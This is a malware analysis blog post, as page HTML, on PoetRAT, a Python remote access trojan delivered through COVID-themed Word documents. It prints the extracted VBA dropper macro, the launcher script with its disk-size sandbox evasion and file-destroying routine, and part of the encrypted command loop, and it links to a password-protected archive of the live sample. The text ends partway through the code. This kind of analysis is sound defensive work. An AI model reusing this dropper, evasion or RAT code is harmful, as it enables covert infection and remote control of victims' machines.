<!DOCTYPE html><html lang="en" ><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no"><meta name="day-prompt" content="days ago"><meta name="hour-prompt" content="hours ago"><meta name="minute-prompt" content="minutes ago"><meta name="justnow-prompt" content="just now"><meta name="generator" content="Jekyll v4.2.1" /><meta property="og:title" content="PoetRAT" /><meta name="author" content="Abdelrahman Eldawi" /><meta property="og:locale" content="en" /><meta name="description" content="Python RAT uses COVID-19 document lures to target Azerbaijan public and private sectors." /><meta property="og:description" content="Python RAT uses COVID-19 document lures to target Azerbaijan public and private sectors." /><link rel="canonical" href="https://abdod97.github.io/posts/PoetRAT-Report/" /><meta property="og:url" content="https://abdod97.github.io/posts/PoetRAT-Report/" /><meta property="og:site_name" content="Abdelrahman Eldawi" /><meta property="og:type" content="article" /><meta property="article:published_time" content="2021-09-25T18:00:00+02:00" /><meta name="twitter:card" content="summary" /><meta property="twitter:title" content="PoetRAT" /><meta name="twitter:site" content="@twitter_usernam" /><meta name="twitter:creator" content="@Abdelrahman Eldawi" /><meta name="google-site-verification" content="google_meta_tag_verification" /> <script type="application/ld+json"> {"author":{"@type":"Person","name":"Abdelrahman Eldawi"},"description":"Python RAT uses COVID-19 document lures to target Azerbaijan public and private sectors.","url":"https://abdod97.github.io/posts/PoetRAT-Report/","@type":"BlogPosting","headline":"PoetRAT","dateModified":"2021-09-26T03:02:38+02:00","datePublished":"2021-09-25T18:00:00+02:00","mainEntityOfPage":{"@type":"WebPage","@id":"https://abdod97.github.io/posts/PoetRAT-Report/"},"@context":"https://schema.org"}</script><title>PoetRAT | Abdelrahman Eldawi</title><link rel="apple-touch-icon" sizes="180x180" href="/assets/img/favicons/apple-touch-icon.png"><link rel="icon" type="image/png" sizes="32x32" href="/assets/img/favicons/favicon-32x32.png"><link rel="icon" type="image/png" sizes="16x16" href="/assets/img/favicons/favicon-16x16.png"><link rel="manifest" href="/assets/img/favicons/site.webmanifest"><link rel="shortcut icon" href="/assets/img/favicons/favicon.ico"><meta name="apple-mobile-web-app-title" content="Abdelrahman Eldawi"><meta name="application-name" content="Abdelrahman Eldawi"><meta name="msapplication-TileColor" content="#da532c"><meta name="msapplication-config" content="/assets/img/favicons/browserconfig.xml"><meta name="theme-color" content="#ffffff"><link rel="preconnect" href="https://fonts.gstatic.com" crossorigin="anonymous"><link rel="dns-prefetch" href="https://fonts.gstatic.com"><link rel="preconnect" href="https://www.google-analytics.com" crossorigin="use-credentials"><link rel="dns-prefetch" href="https://www.google-analytics.com"><link rel="preconnect" href="https://www.googletagmanager.com" crossorigin="anonymous"><link rel="dns-prefetch" href="https://www.googletagmanager.com"><link rel="preconnect" href="https://cdn.jsdelivr.net"><link rel="dns-prefetch" href="https://cdn.jsdelivr.net"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@4.0.0/dist/css/bootstrap.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@5.11.2/css/all.min.css"><link rel="stylesheet" href="/assets/css/style.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/gh/afeld/bootstrap-toc@1.0.1/dist/bootstrap-toc.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/magnific-popup@1.1.0/dist/magnific-popup.min.css"> <script src="https://cdn.jsdelivr.net/npm/jquery@3/dist/jquery.min.js"></script><body data-spy="scroll" data-target="#toc"><div id="sidebar" class="d-flex flex-column align-items-end" lang="en"><div class="profile-wrapper text-center"><div id="avatar"> <a href="/" alt="avatar" class="mx-auto"> <img src="https://cdn.jsdelivr.net/gh/cotes2020/chirpy-images/commons/avatar.jpg" alt="avatar" onerror="this.style.display='none'"> </a></div><div class="site-title mt-3"> <a href="/">Abdelrahman Eldawi</a></div><div class="site-subtitle font-italic">Your weekly Reverse Engineering & Malware Analysis blog</div></div><ul class="w-100"><li class="nav-item"> <a href="/" class="nav-link"> <i class="fa-fw fas fa-home ml-xl-3 mr-xl-3 unloaded"></i> <span>HOME</span> </a><li class="nav-item"> <a href="/categories/" class="nav-link"> <i class="fa-fw fas fa-stream ml-xl-3 mr-xl-3 unloaded"></i> <span>CATEGORIES</span> </a><li class="nav-item"> <a href="/tags/" class="nav-link"> <i class="fa-fw fas fa-tags ml-xl-3 mr-xl-3 unloaded"></i> <span>TAGS</span> </a><li class="nav-item"> <a href="/archives/" class="nav-link"> <i class="fa-fw fas fa-archive ml-xl-3 mr-xl-3 unloaded"></i> <span>ARCHIVES</span> </a><li class="nav-item"> <a href="/about/" class="nav-link"> <i class="fa-fw fas fa-info ml-xl-3 mr-xl-3 unloaded"></i> <span>ABOUT</span> </a></ul><div class="sidebar-bottom mt-auto d-flex flex-wrap justify-content-center"> <a href="https://github.com/abdod97" aria-label="github" class="order-3" target="_blank" rel="noopener"> <i class="fab fa-github-alt"></i> </a> <a href="https://twitter.com/twitter_usernam" aria-label="twitter" class="order-4" target="_blank" rel="noopener"> <i class="fab fa-twitter"></i> </a> <a href=" javascript:location.href = 'mailto:' + ['abdelrahman.eldawi97','gmail.com'].join('@')" aria-label="email" class="order-5" > <i class="fas fa-envelope"></i> </a> <a href="/feed.xml" aria-label="rss" class="order-6" > <i class="fas fa-rss"></i> </a> <span class="icon-border order-2"></span> <span id="mode-toggle-wrapper" class="order-1"> <i class="mode-toggle fas fa-adjust"></i> <script type="text/javascript"> class ModeToggle { static get MODE_KEY() { return "mode"; } static get DARK_MODE() { return "dark"; } static get LIGHT_MODE() { return "light"; } constructor() { if (this.hasMode) { if (this.isDarkMode) { if (!this.isSysDarkPrefer) { this.setDark(); } } else { if (this.isSysDarkPrefer) { this.setLight(); } } } var self = this; /* always follow the system prefers */ this.sysDarkPrefers.addListener(function() { if (self.hasMode) { if (self.isDarkMode) { if (!self.isSysDarkPrefer) { self.setDark(); } } else { if (self.isSysDarkPrefer) { self.setLight(); } } self.clearMode(); } self.updateMermaid(); }); } /* constructor() */ setDark() { $('html').attr(ModeToggle.MODE_KEY, ModeToggle.DARK_MODE); sessionStorage.setItem(ModeToggle.MODE_KEY, ModeToggle.DARK_MODE); } setLight() { $('html').attr(ModeToggle.MODE_KEY, ModeToggle.LIGHT_MODE); sessionStorage.setItem(ModeToggle.MODE_KEY, ModeToggle.LIGHT_MODE); } clearMode() { $('html').removeAttr(ModeToggle.MODE_KEY); sessionStorage.removeItem(ModeToggle.MODE_KEY); } get sysDarkPrefers() { return window.matchMedia("(prefers-color-scheme: dark)"); } get isSysDarkPrefer() { return this.sysDarkPrefers.matches; } get isDarkMode() { return this.mode == ModeToggle.DARK_MODE; } get isLightMode() { return this.mode == ModeToggle.LIGHT_MODE; } get hasMode() { return this.mode != null; } get mode() { return sessionStorage.getItem(ModeToggle.MODE_KEY); } /* get the current mode on screen */ get modeStatus() { if (this.isDarkMode || (!this.hasMode && this.isSysDarkPrefer) ) { return ModeToggle.DARK_MODE; } else { return ModeToggle.LIGHT_MODE; } } updateMermaid() { if (typeof mermaid !== "undefined") { let expectedTheme = (this.modeStatus === ModeToggle.DARK_MODE? "dark" : "default"); let config = { theme: expectedTheme }; /* re-render the SVG › <https://github.com/mermaid-js/mermaid/issues/311#issuecomment-332557344> */ $(".mermaid").each(function() { let svgCode = $(this).prev().children().html(); $(this).removeAttr("data-processed"); $(this).html(svgCode); }); mermaid.initialize(config); mermaid.init(undefined, ".mermaid"); } } flipMode() { if (this.hasMode) { if (this.isSysDarkPrefer) { if (this.isLightMode) { this.clearMode(); } else { this.setLight(); } } else { if (this.isDarkMode) { this.clearMode(); } else { this.setDark(); } } } else { if (this.isSysDarkPrefer) { this.setLight(); } else { this.setDark(); } } this.updateMermaid(); } /* flipMode() */ } /* ModeToggle */ let toggle = new ModeToggle(); $(".mode-toggle").click(function() { toggle.flipMode(); }); </script> </span></div></div><div id="topbar-wrapper" class="row justify-content-center topbar-down"><div id="topbar" class="col-11 d-flex h-100 align-items-center justify-content-between"> <span id="breadcrumb"> <span> <a href="/"> Home </a> </span> <span>PoetRAT</span> </span> <i id="sidebar-trigger" class="fas fa-bars fa-fw"></i><div id="topbar-title"> Post</div><i id="search-trigger" class="fas fa-search fa-fw"></i> <span id="search-wrapper" class="align-items-center"> <i class="fas fa-search fa-fw"></i> <input class="form-control" id="search-input" type="search" aria-label="search" autocomplete="off" placeholder="Search..."> <i class="fa fa-times-circle fa-fw" id="search-cleaner"></i> </span> <span id="search-cancel" >Cancel</span></div></div><div id="main-wrapper"><div id="main"><div class="row"><div id="post-wrapper" class="col-12 col-lg-11 col-xl-8"><div class="post pl-1 pr-1 pl-sm-2 pr-sm-2 pl-md-4 pr-md-4"><h1 data-toc-skip>PoetRAT</h1><div class="post-meta text-muted d-flex flex-column"><div> <span class="semi-bold"> Abdelrahman Eldawi </span> on <span class="timeago " data-toggle="tooltip" data-placement="bottom" title="Sat, Sep 25, 2021, 6:00 PM +0200" >Sep 25<i class="unloaded">2021-09-25T18:00:00+02:00</i> </span></div><div> <span> Updated <span class="timeago lastmod" data-toggle="tooltip" data-placement="bottom" title="Sun, Sep 26, 2021, 3:02 AM +0200" >Sep 26<i class="unloaded">2021-09-26T03:02:38+02:00</i> </span> </span> <span class="readtime" data-toggle="tooltip" data-placement="bottom" title="4183 words">23 min read</span></div></div><div class="post-content"> <img src="data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 850 585'%3E%3C/svg%3E" data-proofer-ignore data-src="https://github.com/AbdoD97/abdod97.github.io/blob/master/_posts/PoetRAT/media/PoetRAT-blog.jpg?raw=true" class="preview-img" alt="Preview Image" width="850" height="585"><p>Python RAT uses COVID-19 document lures to target Azerbaijan public and private sectors.</p><p>Azerbaijan government and energy sector likely targeted by an unknown actor.</p><p>From the energy sector, the actor demonstrates interest in SCADA systems related to wind turbines.</p><p>Attachments: Malware dropped archive including malicious python scripts (Pw:infected)</p><p><a href="https://github.com/AbdoD97/abdod97.github.io/blob/master/_posts/PoetRAT/password%20infected.rar">https://github.com/AbdoD97/abdod97.github.io/blob/master/_posts/PoetRAT/password%20infected.rar</a></p><p><strong>Sample Information</strong></p><p>SHA256:208EC23C233580DBFC53AAD5655845F7152ADA56DD6A5C780D54E84A9D227407</p><p>MD5:3AADBF7E527FC1A050E1C97FEA1CBA4D</p><p>SHA1:2CF055B3EF60582CA72E77BC4693EA306360F611</p><p>Version: 4</p><p>Sample Type: Trojan dropper, Remote Administration Tool (RAT)</p><p><strong>Executive Summary</strong></p><p>This malware is a word document, by opening this document a malicious script is executed (Macro VBA script), it drops a malware in your system which connects to the command-and-control server giving it instructions to be executed in your machine, this malware can be used for various purposes, including, but not limited to Information stealing, spying and capabilities can be leveraged by having another malware executed without your permission.</p><h1 id="initial-assessment">Initial assessment</h1><p>At Malware initial assessment using <strong>Pestudio</strong>, by looking to its magic bytes it looks like that this file is not .exe file, by checking the file signature “D0 CF 11 E0 A1 B1 1A E1” we can narrow the possibilities to (<strong>doc, xls, ppt</strong>) extensions</p><h1 id="virus-total-scan">Virus Total scan</h1><p><img data-proofer-ignore data-src="https://github.com/AbdoD97/abdod97.github.io/blob/master/_posts/PoetRAT/media/image1.png?raw=true" alt="" /></p><p>After virus total scan as it appears that its Microsoft word file behaves as Downloader &amp; dropper so apparently it has macro</p><h1 id="dynamic-analysis-using-sandbox">Dynamic analysis using sandbox</h1><p>Using <strong>any.run</strong> service it was found that Microsoft word process is opening 3 CMD to execute python scripts dropped by the document.</p><p><img data-proofer-ignore data-src="https://github.com/AbdoD97/abdod97.github.io/blob/master/_posts/PoetRAT/media/image2.png?raw=true" alt="" /> #</p><h1 id="macro-extraction">Macro extraction</h1><p>By using <strong>ViperMonkey</strong> I was able to extract the VBA macros</p><p><img data-proofer-ignore data-src="https://github.com/AbdoD97/abdod97.github.io/blob/master/_posts/PoetRAT/media/image3.png?raw=true" alt="" /></p><h1 id="extracted-vba-macro">Extracted VBA macro</h1><pre><code class="language-vbnet">from vb2py.vbfunctions import *
from vb2py.vbdebug import *
def document_open():
    data = String()
    User = String()
    bla = String()
    Coper = Object()
    ActiveDocument.ActiveWindow.View.ReadingLayout = False
    ActiveDocument.Unprotect('securePass')
    show()
    ActiveDocument.Protect(wdAllowOnlyReading, True, 'securePass', False, False)
    User = 'C:\\Users\\Public'
    Docer = ActiveDocument.FullName
    #Copy
    Shell('cmd /c copy ' + Docer + ' ' + User + '\\docer.doc', vbHide)
    deay()(( 4 ))
    data = bin2var(User + '\\docer.doc')
    data = Right(data, 7074638)
    var2bin(User + '\\smile.zip', data)
    bla = VBA.FileSystem.Dir(User + '\\Python37', vbDirectory)
    if bla != VBA.Constants.vbNullString:
        Shell('cmd /c rmdir /s /q ' + User + '\\Python37', vbHide)
        deay()(( 2 ))
    #Unzip
    Unzip(User + '\\smile.zip', User, 'Python37')
    #Clean
    Kill(User + '\\smile.zip')
    Kill(User + '\\docer.doc')
    #Run
    Shell('"' + User + '\\Python37\\python.exe' + '" "' + User + '\\Python37\\launcher.py' + '"', vbHide)

def bin2var(filename):
    f = Integer()
    #Which alters when it alteration finds,
    #Or bends with the remover to remove.
    f = FreeFile()
    VBFiles.openFile(f, filename, 'b') # VB2PY (UnknownFileMode) 'Access', 'Read', 'Lock', 'Write'
    fn_return_value = Space(FileLen(filename))
    Get(f, VBGetMissingArgument(Get, 1), bin2var())
    VBFiles.closeFile(f)
    #O no! it is an ever-fixed mark
    #That looks on tempests and is never shaken;
    return fn_return_value

def var2bin(filename, data):
    f = Integer()
    #If this be error and upon me prov'd,
    #I never writ, nor no man ever lov'd.
    f = FreeFile()
    VBFiles.openFile(f, filename, 'w') # VB2PY (UnknownFileMode) 'Access', 'Write', 'Lock', 'Write'
    VBFiles.writeText(f, data)
    VBFiles.closeFile(f)
def Unzip(Fname, DefPath, TarFold):
    oApp = Object()
    FileNameFolder = Variant()
    #Root folder for the new folder.
    if Right(DefPath, 1) != '\\':
        DefPath = DefPath + '\\'
    #Create the folder name
    strDate = Format(Now, ' dd-mm-yy h-mm-ss')
    FileNameFolder = DefPath + TarFold + '\\'
    #Make the normal folder in DefPath
    MkDir(FileNameFolder)
    #Extract the files into the newly created folder
    oApp = CreateObject('Shell.Application')
    oApp.Namespace(FileNameFolder).CopyHere(oApp.Namespace(Fname).items, 4)
def hide():
    ActiveDocument.Sections[1].Range.Font.Hidden = False
    for Section in ActiveDocument.Sections:
        if Section.Index &gt; 1:
            Section.Range.Font.Hidden = True
def show():
    ActiveDocument.Sections[1].Range.Font.Hidden = True
    for Section in ActiveDocument.Sections:
        if Section.Index &gt; 1:
            Section.Range.Font.Hidden = False
def deay(min):
    ptr = Variant()
    ptr = DateAdd('s', min, Time())
    if ptr &gt; Time():
        while not (( Time() &gt; ptr )):
            pass
    return fn_return_value

</code></pre><h1 id="vba-macro-analysis">VBA Macro Analysis</h1><p>At first it copies the document file to “<strong>C:\Users\Public\docer.doc</strong>”</p><p>Then it executes “<strong>bin2var</strong>” function which extracts the latest “<strong>7074638 Bytes</strong>” from the document and creates “<strong>smile.zip</strong>”, So this python script can be used to extract the zip file from the document</p><div class="language-python highlighter-rouge"><div class="code-header" data-lang="python"><button><i class="fa-fw far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
</pre><td class="rouge-code"><pre><span class="n">f</span> <span class="o">=</span> <span class="nb">open</span><span class="p">(</span><span class="s">'Sample1'</span><span class="p">,</span> <span class="s">'rb'</span><span class="p">)</span>
<span class="n">content</span> <span class="o">=</span> <span class="n">f</span><span class="p">.</span><span class="n">read</span><span class="p">()</span>
<span class="n">zip_file</span> <span class="o">=</span> <span class="n">content</span><span class="p">[</span><span class="nb">len</span><span class="p">(</span><span class="n">content</span><span class="p">)</span><span class="o">-</span><span class="mi">7074638</span><span class="p">:</span><span class="nb">len</span><span class="p">(</span><span class="n">content</span><span class="p">)]</span>
<span class="n">z</span><span class="o">=</span> <span class="nb">open</span><span class="p">(</span><span class="s">'Sample.zip'</span><span class="p">,</span><span class="s">'wb'</span><span class="p">)</span>
<span class="n">z</span><span class="p">.</span><span class="n">write</span><span class="p">(</span><span class="n">zip_file</span><span class="p">)</span>
<span class="n">f</span><span class="p">.</span><span class="n">close</span><span class="p">()</span>
<span class="n">z</span><span class="p">.</span><span class="n">close</span><span class="p">()</span>

</pre></table></code></div></div><p>then it unzips it into “<strong>C:\Users\Public\ Python37</strong>”, Apparently the extracted files are <strong>python version 3.7</strong> and some <strong>malicious scripts</strong></p><p><strong>“affine.py, backer.py, frown.py, launcher.py, smile.py, smile_funs.py”</strong></p><p>Then it launches the “<strong>Launcher.py</strong>” script</p><p><a href="https://attack.mitre.org/techniques/T1059/">https://attack.mitre.org/techniques/T1059/</a></p><h1 id="malicious-scripts-analysis">Malicious scripts analysis</h1><h2 id="launcherpy"><strong>Launcher.py</strong></h2><div class="language-python highlighter-rouge"><div class="code-header" data-lang="python"><button><i class="fa-fw far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
34
35
36
37
38
</pre><td class="rouge-code"><pre><span class="kn">import</span> <span class="nn">shutil</span>
<span class="kn">import</span> <span class="nn">sys</span>
<span class="kn">import</span> <span class="nn">time</span>
<span class="kn">import</span> <span class="nn">uuid</span>
<span class="kn">import</span> <span class="nn">smile_funs</span>
<span class="n">me</span> <span class="o">=</span> <span class="n">sys</span><span class="p">.</span><span class="n">argv</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span>
<span class="n">fold</span> <span class="o">=</span> <span class="n">me</span><span class="p">[:</span><span class="n">me</span><span class="p">.</span><span class="n">rfind</span><span class="p">(</span><span class="s">"</span><span class="se">\\</span><span class="s">"</span><span class="p">)</span> <span class="o">+</span> <span class="mi">1</span><span class="p">]</span>

<span class="k">def</span> <span class="nf">police</span><span class="p">():</span>
    <span class="n">smile_funs</span><span class="p">.</span><span class="n">run_cmd</span><span class="p">(</span><span class="s">"</span><span class="se">\"</span><span class="s">{0}python.exe</span><span class="se">\"</span><span class="s"> </span><span class="se">\"</span><span class="s">{0}smile.py</span><span class="se">\"</span><span class="s">"</span><span class="p">.</span><span class="nb">format</span><span class="p">(</span><span class="n">fold</span><span class="p">),</span> <span class="bp">False</span><span class="p">)</span>
    <span class="n">time</span><span class="p">.</span><span class="n">sleep</span><span class="p">(</span><span class="mi">5</span><span class="p">)</span>
    <span class="n">smile_funs</span><span class="p">.</span><span class="n">run_cmd</span><span class="p">(</span><span class="s">"</span><span class="se">\"</span><span class="s">{0}python.exe</span><span class="se">\"</span><span class="s"> </span><span class="se">\"</span><span class="s">{0}frown.py</span><span class="se">\"</span><span class="s">"</span><span class="p">.</span><span class="nb">format</span><span class="p">(</span><span class="n">fold</span><span class="p">),</span> <span class="bp">False</span><span class="p">)</span>
<span class="k">def</span> <span class="nf">crack</span><span class="p">():</span>
    <span class="c1"># Crack everything at this point
</span>    <span class="nb">open</span><span class="p">(</span><span class="n">fold</span> <span class="o">+</span> <span class="s">"smile.py"</span><span class="p">,</span> <span class="s">"wb"</span><span class="p">).</span><span class="n">write</span><span class="p">(</span><span class="nb">open</span><span class="p">(</span><span class="n">fold</span> <span class="o">+</span> <span class="s">"LICENSE.txt"</span><span class="p">,</span> <span class="s">"rb"</span><span class="p">).</span><span class="n">read</span><span class="p">())</span>
    <span class="nb">open</span><span class="p">(</span><span class="n">fold</span> <span class="o">+</span> <span class="s">"smile_funs.py"</span><span class="p">,</span> <span class="s">"wb"</span><span class="p">).</span><span class="n">write</span><span class="p">(</span><span class="nb">open</span><span class="p">(</span><span class="n">fold</span> <span class="o">+</span> <span class="s">"LICENSE.txt"</span><span class="p">,</span> <span class="s">"rb"</span><span class="p">).</span><span class="n">read</span><span class="p">())</span>
    <span class="nb">open</span><span class="p">(</span><span class="n">fold</span> <span class="o">+</span> <span class="s">"frown.py"</span><span class="p">,</span> <span class="s">"wb"</span><span class="p">).</span><span class="n">write</span><span class="p">(</span><span class="nb">open</span><span class="p">(</span><span class="n">fold</span> <span class="o">+</span> <span class="s">"LICENSE.txt"</span><span class="p">,</span> <span class="s">"rb"</span><span class="p">).</span><span class="n">read</span><span class="p">())</span>
    <span class="n">sys</span><span class="p">.</span><span class="nb">exit</span><span class="p">(</span><span class="mi">4</span><span class="p">)</span>
<span class="k">def</span> <span class="nf">good_disk_size</span><span class="p">():</span>
    <span class="c1"># There are no computers with disk size less than 62
</span>    <span class="k">return</span> <span class="mi">62</span> <span class="o">&lt;</span> <span class="nb">round</span><span class="p">(</span><span class="n">shutil</span><span class="p">.</span><span class="n">disk_usage</span><span class="p">(</span><span class="s">"/"</span><span class="p">)[</span><span class="mi">0</span><span class="p">])</span> <span class="o">/</span> <span class="mi">2</span> <span class="o">**</span> <span class="mi">30</span>
<span class="k">if</span> <span class="n">__name__</span> <span class="o">==</span> <span class="s">'__main__'</span><span class="p">:</span>
    <span class="k">if</span> <span class="nb">len</span><span class="p">(</span><span class="n">sys</span><span class="p">.</span><span class="n">argv</span><span class="p">)</span> <span class="o">==</span> <span class="mi">2</span><span class="p">:</span>
        <span class="k">if</span> <span class="n">sys</span><span class="p">.</span><span class="n">argv</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span> <span class="o">==</span> <span class="s">"police"</span><span class="p">:</span>
            <span class="n">police</span><span class="p">()</span>
    <span class="k">else</span><span class="p">:</span>
        <span class="c1"># Sandbox Evasion
</span>        <span class="k">if</span> <span class="ow">not</span> <span class="n">good_disk_size</span><span class="p">():</span>
            <span class="n">crack</span><span class="p">()</span>
            <span class="n">sys</span><span class="p">.</span><span class="nb">exit</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span>
        <span class="c1"># Reaching this far means that we are not in a sandbox, Probably
</span>        <span class="n">d</span> <span class="o">=</span> <span class="nb">open</span><span class="p">(</span><span class="n">fold</span> <span class="o">+</span> <span class="s">"frown.py"</span><span class="p">,</span> <span class="s">"r"</span><span class="p">).</span><span class="n">read</span><span class="p">()</span>
        <span class="n">uu</span> <span class="o">=</span> <span class="nb">str</span><span class="p">(</span><span class="n">uuid</span><span class="p">.</span><span class="n">uuid4</span><span class="p">())</span>
        <span class="n">d</span> <span class="o">=</span> <span class="n">d</span><span class="p">.</span><span class="n">replace</span><span class="p">(</span><span class="s">"THE_GUID_KEY"</span><span class="p">,</span> <span class="n">uu</span><span class="p">)</span>
        <span class="nb">open</span><span class="p">(</span><span class="n">fold</span> <span class="o">+</span> <span class="s">"frown.py"</span><span class="p">,</span> <span class="s">"w"</span><span class="p">).</span><span class="n">write</span><span class="p">(</span><span class="n">d</span><span class="p">)</span>
        <span class="nb">open</span><span class="p">(</span><span class="n">fold</span> <span class="o">+</span> <span class="s">".key"</span><span class="p">,</span> <span class="s">"w+"</span><span class="p">).</span><span class="n">write</span><span class="p">(</span><span class="n">uu</span><span class="p">)</span>
        <span class="n">police</span><span class="p">()</span>

</pre></table></code></div></div><p>If there are <strong>no arguments passed</strong></p><ul><li><p>It will check the <strong>containing disk size</strong>, if it's less than <strong>64gb</strong> then it would be <strong>sandbox</strong> </p><li><p>If so it activates “<strong>crack function”</strong>, which destroys the 3 scripts (<strong>smile.py, smile_funs.py, frown.py</strong>) by <strong>overwriting their contents</strong> with (<strong>LICENSE.txt</strong>) content as an <strong>anti-sandbox technique</strong>.</p><li><p>if sandbox check determined that it’s not a sandbox, <strong>it will generate an “UUID” and replace “THE_GUID_KEY" word in “Frown.py” script with it</strong></p><li><p>Then it writes the “<strong>THE_GUID_KEY</strong>” into “.<strong>key</strong>” file <strong>(It serves as a unique identifier for the victim)</strong>.</p><li><p>Then it fires <strong>Police function</strong>.</p></ul><p><strong>Police function</strong></p><ul><li><p>It launches both “<strong>Smile.py, Frown.py”</strong> files.</p><li><p>This function is basically launched under two cases, the first one is <strong>passing argument “Police”</strong> or continuing the flow of the script <strong>after writing “.key” file</strong>.</p></ul><h2 id="smilepy"><strong>Smile.py</strong></h2><div class="language-python highlighter-rouge"><div class="code-header" data-lang="python"><button><i class="fa-fw far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
34
35
36
37
38
39
40
41
42
43
44
45
46
47
48
49
</pre><td class="rouge-code"><pre><span class="kn">import</span> <span class="nn">multiprocessing</span>
<span class="kn">import</span> <span class="nn">sys</span>
<span class="kn">from</span> <span class="nn">colorama</span> <span class="kn">import</span> <span class="n">init</span> <span class="k">as</span> <span class="n">c_init</span><span class="p">,</span> <span class="n">Fore</span><span class="p">,</span> <span class="n">Style</span>
<span class="kn">from</span> <span class="nn">affine</span> <span class="kn">import</span> <span class="n">Affine</span>
<span class="kn">from</span> <span class="nn">smile_funs</span> <span class="kn">import</span> <span class="o">*</span>
<span class="n">c_init</span><span class="p">()</span>
<span class="n">wanted</span> <span class="o">=</span> <span class="bp">True</span>
<span class="k">def</span> <span class="nf">communicate</span><span class="p">():</span>
    <span class="n">resp</span> <span class="o">=</span> <span class="s">""</span>
    <span class="n">aff</span> <span class="o">=</span> <span class="n">Affine</span><span class="p">()</span>
    <span class="k">while</span> <span class="n">resp</span> <span class="o">!=</span> <span class="s">"exit"</span><span class="p">:</span>
        <span class="k">try</span><span class="p">:</span>
            <span class="n">header</span> <span class="o">=</span> <span class="sa">f</span><span class="s">"""</span><span class="se">\n</span><span class="si">{</span><span class="n">Fore</span><span class="p">.</span><span class="n">RED</span><span class="si">}{</span><span class="n">getuser</span><span class="p">()</span><span class="si">}</span><span class="s">@</span><span class="si">{</span><span class="n">platform</span><span class="p">.</span><span class="n">node</span><span class="p">()</span><span class="si">}{</span><span class="n">Style</span><span class="p">.</span><span class="n">RESET_ALL</span><span class="si">}</span><span class="s">:</span><span class="si">{</span><span class="n">Fore</span><span class="p">.</span><span class="n">LIGHTBLUE_EX</span><span class="si">}{</span><span class="n">os</span><span class="p">.</span><span class="n">getcwd</span><span class="p">()</span><span class="si">}{</span><span class="n">Style</span><span class="p">.</span><span class="n">RESET_ALL</span><span class="si">}</span><span class="s">$ """</span>
            <span class="k">try</span><span class="p">:</span>
                <span class="n">it</span> <span class="o">=</span> <span class="nb">open</span><span class="p">(</span><span class="n">pipe_out</span><span class="p">,</span> <span class="s">"wb"</span><span class="p">)</span>
                <span class="n">it</span><span class="p">.</span><span class="n">truncate</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span>
                <span class="n">it</span><span class="p">.</span><span class="n">write</span><span class="p">(</span><span class="n">aff</span><span class="p">.</span><span class="n">encrypt</span><span class="p">(</span><span class="n">resp</span> <span class="o">+</span> <span class="n">header</span><span class="p">))</span>
                <span class="n">resp</span> <span class="o">=</span> <span class="s">""</span>
                <span class="n">it</span><span class="p">.</span><span class="n">close</span><span class="p">()</span>
            <span class="k">except</span> <span class="nb">Exception</span> <span class="k">as</span> <span class="n">e</span><span class="p">:</span>
                <span class="n">it</span> <span class="o">=</span> <span class="nb">open</span><span class="p">(</span><span class="n">pipe_out</span><span class="p">,</span> <span class="s">"w+"</span><span class="p">)</span>
                <span class="n">it</span><span class="p">.</span><span class="n">truncate</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span>
                <span class="n">it</span><span class="p">.</span><span class="n">write</span><span class="p">(</span><span class="n">aff</span><span class="p">.</span><span class="n">encrypt</span><span class="p">(</span><span class="nb">str</span><span class="p">(</span><span class="n">e</span><span class="p">)</span> <span class="o">+</span> <span class="n">header</span><span class="p">))</span>
                <span class="n">it</span><span class="p">.</span><span class="n">close</span><span class="p">()</span>
            <span class="n">file_ready</span><span class="p">()</span>

            <span class="n">waiting_file</span><span class="p">()</span>
            <span class="n">cmd</span> <span class="o">=</span> <span class="n">aff</span><span class="p">.</span><span class="n">decrypt</span><span class="p">(</span><span class="nb">open</span><span class="p">(</span><span class="n">pipe_out</span><span class="p">,</span> <span class="s">"rb"</span><span class="p">).</span><span class="n">read</span><span class="p">())</span>
            <span class="k">if</span> <span class="nb">len</span><span class="p">(</span><span class="n">cmd</span><span class="p">)</span> <span class="o">&gt;</span> <span class="mi">2</span> <span class="ow">and</span> <span class="s">"$$"</span> <span class="o">==</span> <span class="n">cmd</span><span class="p">[</span><span class="mi">0</span><span class="p">:</span><span class="mi">2</span><span class="p">]:</span>
                <span class="n">receiver</span><span class="p">,</span> <span class="n">sender</span> <span class="o">=</span> <span class="n">multiprocessing</span><span class="p">.</span><span class="n">Pipe</span><span class="p">(</span><span class="bp">False</span><span class="p">)</span>
                <span class="n">process</span> <span class="o">=</span> <span class="n">multiprocessing</span><span class="p">.</span><span class="n">Process</span><span class="p">(</span><span class="n">target</span><span class="o">=</span><span class="n">work_on_cmd_process</span><span class="p">,</span> <span class="n">name</span><span class="o">=</span><span class="n">cmd</span><span class="p">[</span><span class="mi">2</span><span class="p">:],</span> <span class="n">args</span><span class="o">=</span><span class="p">(</span><span class="n">cmd</span><span class="p">[</span><span class="mi">2</span><span class="p">:],</span> <span class="n">sender</span><span class="p">),</span>
                                                  <span class="n">daemon</span><span class="o">=</span><span class="bp">True</span><span class="p">)</span>
